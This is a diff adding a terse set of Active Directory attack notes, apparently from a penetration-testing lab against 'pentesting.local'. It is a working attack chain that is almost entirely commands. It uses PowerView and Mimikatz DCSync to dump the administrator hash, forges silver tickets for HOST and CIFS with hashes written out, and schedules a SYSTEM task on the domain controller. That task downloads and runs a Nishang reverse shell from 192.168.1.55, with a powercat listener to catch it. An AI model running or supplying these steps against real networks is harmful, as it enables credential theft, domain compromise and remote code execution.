@@ -1,0 +1,47 @@
+
+. .\powerview
+Get-DomainSID
+S-1-5-21-1070240333-336889418-1185445934
+
+#run dcsync to get administrator's HASH
+. .\invoke-mimikatz
+invoke-mimikatz -Command '"lsadump::dcsync /user:pentesting\administrator"'
+
+#Create Silver ticker for HOST
+Invoke-Mimikatz -Command '"kerberos::golden /domain:pentesting.local /sid:S-1-5-21-1070240333-336889418-1185445934 /target:dc.pentesting.local /service:HOST /rc4:2b576acbe6bcfda7294d6bd18041b8fe /user:Administrator /ptt"'
+
+#List the current ticket
+klist
+
+
+#See if you have access
+schtasks /s dc.pentesting.local 
+
+#edit Invoke-PowerShellTcp.ps1 or Invoke-PowerShellTcpOneLine.ps1
+#Download it from here: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1
+#add the following at the end of the file
+Invoke-PowerShellTcp -Reverse -IPAddress <localIP> -Port 443
+
+
+#Host the edited Invoke-PowerShellTcp.ps1 with HFS:
+https://www.rejetto.com/hfs/?f=dl
+
+#listen with Powercat
+powercat -l -v -p 4444 -t 1000
+
+#Schedule a task
+schtasks /create /S dc.pentesting.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.1.55/Invoke-PowerShellTcpOneLine.ps1''')'"
+
+
+#Run The task
+schtasks /Run /S dc.pentesting.local  /TN "STCheck"
+
+
+#Extra
+#Using hash of the Domain Controller computer account, below
+#command provides access to shares on the DC.
+
+Invoke-Mimikatz -Command '"kerberos::golden /domain:pentesting.local /sid:S-1-5-21-1070240333-336889418-1185445934 /target:pentesting.local /service:CIFS /rc4:2723620aa872abc65ea53178070f4bc7 /user:Administrator /ptt"'
+
+#Similar command can be used for any other service on a machine.
+Which services? SPN: HOST, RPCSS, WSMAN and many more.
